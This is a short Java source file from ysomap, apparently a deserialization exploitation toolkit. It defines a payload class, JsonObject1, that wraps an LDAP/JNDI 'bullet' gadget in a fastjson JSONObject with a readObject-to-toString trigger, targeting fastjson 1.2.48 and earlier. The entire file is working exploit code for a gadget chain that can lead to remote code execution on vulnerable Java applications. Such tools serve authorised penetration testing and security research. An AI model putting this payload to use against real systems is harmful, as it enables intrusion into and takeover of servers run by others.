package ysomap.payloads.java.fastjson;

import com.alibaba.fastjson.JSONObject;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.payloads.AbstractPayload;

/**
 * @author wh1t3p1g
 * @since 2022/9/5
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({Targets.JDK, Targets.JNDI})
@Require(bullets = {"LdapAttributeBullet", "JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"fastjson<=1.2.48"})
public class JsonObject1 extends AbstractPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        JSONObject map = new JSONObject();
        map.put("ysomap", obj);
        return PayloadHelper.makeReadObjectToStringTrigger(map);
    }
}
